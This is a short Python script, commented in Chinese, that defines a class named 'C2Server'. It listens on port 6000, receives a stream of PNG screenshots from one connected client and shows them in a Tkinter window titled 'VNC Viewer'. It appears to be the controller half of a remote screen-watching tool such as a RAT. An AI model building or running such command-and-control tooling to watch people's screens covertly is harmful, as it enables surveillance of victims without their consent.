import socket
import tkinter as tk
from PIL import Image, ImageTk
import io
import threading
import struct

class C2Server:
    def __init__(self):
        self.server = socket.socket()
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(('0.0.0.0', 6000))
        self.server.listen(5)
        
        self.root = tk.Tk()
        self.root.title("VNC Viewer")
        self.label = tk.Label(self.root)
        self.label.pack(expand=True, fill='both')
        
        self.conn = None
        self.lock = threading.Lock()

    def start(self):
        print("[*] Waiting for connection...")
        self.conn, addr = self.server.accept()
        print(f"[+] Connected from {addr}")
        
        threading.Thread(target=self.recv_thread, daemon=True).start()
        self.root.mainloop()

    def recv_thread(self):
        try:
            while True:
                # 读取数据长度
                header = self.conn.recv(4)
                if len(header) != 4:
                    break
                length = struct.unpack("!i", header)[0]
                
                # 接收完整数据
                data = bytearray()
                while len(data) < length:
                    remaining = length - len(data)
                    data += self.conn.recv(min(4096, remaining))
                
                # 调试保存
                with open('/tmp/server_received.png', 'wb') as f:
                    f.write(data)
                
                # 显示图像
                img = Image.open(io.BytesIO(data)).convert('RGB')
                img.thumbnail((self.root.winfo_screenwidth(), self.root.winfo_screenheight()))
                
                # 必须在主线程更新 GUI
                self.root.after(0, self.update_image, img)
        except Exception as e:
            print(f"[-] Error: {str(e)}")

    def update_image(self, img):
        with self.lock:
            photo = ImageTk.PhotoImage(img)
            self.label.configure(image=photo)
            self.label.image = photo

if __name__ == '__main__':
    server = C2Server()
    server.start()